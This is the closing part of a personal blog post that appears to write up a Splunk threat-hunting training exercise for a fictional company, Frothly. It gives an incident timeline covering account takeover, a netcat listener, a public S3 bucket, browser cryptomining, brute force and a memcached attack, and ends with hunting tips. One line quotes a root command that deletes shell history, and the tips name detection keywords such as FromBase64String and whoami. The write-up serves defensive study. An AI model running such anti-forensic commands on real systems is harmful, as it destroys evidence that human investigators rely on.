+<p>11:41:36: Kevin Lagerfield Azure AD account password reset</p>
+<p>11:42:51: Kevin Lagerfield Azure AD account password reset</p>
+<p>11:43:22: Kevin Lagerfield Azure AD account password changed</p>
+<p>11:48:38: root runs <code>rm /usr/share/tomcat8/.bash_history</code></p>
+<p>11:55:34: netcat listening on port 1337 ends</p>
+<p>13:01:46: frothlywebcode S3 bucket made public</p>
+<p>13:02:44: OPEN_BUCKET_PLEASE_FIX.txt uploaded to frothlywebcode</p>
+<p>13:04:17: frothly_html_memcached.tar.gz uploaded to frothlywebcode</p>
+<p>13:33:24: gacrux.i-0cc93bade2b3cba63 autoscaled</p>
+<p>13:37:33: BSTOLL-L Coinhive DNS lookup</p>
+<p>13:37:40: First BTUN-L JSCoinMiner detection</p>
+<p>13:37:50: BSTOLL-L Chrome Monero mining begins</p>
+<p>13:46:47: Last BTUN-L JSCoinMiner detection</p>
+<p>13:57:54: frothlywebcode S3 bucket made private</p>
+<p>14:05:23: BSTOLL-L Chrome Monero mining ends</p>
+<p>14:23:19: gacrux.i-06fea586f3d3c8ce8 autoscaled</p>
+<p>14:25:21: gacrux.i-09cbc261e84259b54 autoscaled</p>
+<p>14:47:12: Azure AD <a href="mailto:bgist@froth.ly">bgist@froth.ly</a> disabled by <a href="mailto:fyodor@froth.ly">fyodor@froth.ly</a></p>
+<p>15:07:22: Brute force against web servers from 5.101.40.81 starts</p>
+<p>15:08:12: Brute force against web servers from 5.101.40.81 ends</p>
+<p>15:11:35: Memcached attack start</p>
+<p>15:27:09: Memcached attack end</p>
+<p>15:15:00: Email bragging about customer data exfiltration</p>
+<h2 id="key-learnings">Key Learnings</h2>
+<ul>
+<li>Do initial recon on hosts, sources, and sourcetypes, to understand where you might find different types of data</li>
+<li><code>FromBase64String</code> can often provide good results, ditto common Linux strings e.g. <code>whoami</code></li>
+<li>Often searching key words/phrases will give you a lot more than you expect</li>
+</ul>
+<p><br/><br/></p>
+
+                </div>
+                
+                <div class="post-comments">
+                    
+                </div>
+                
+            </div>
+            <footer class="footer text-center">
+<p>Copyright &copy; 2022 James -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+</footer>
+
+        </div>
+    </body>
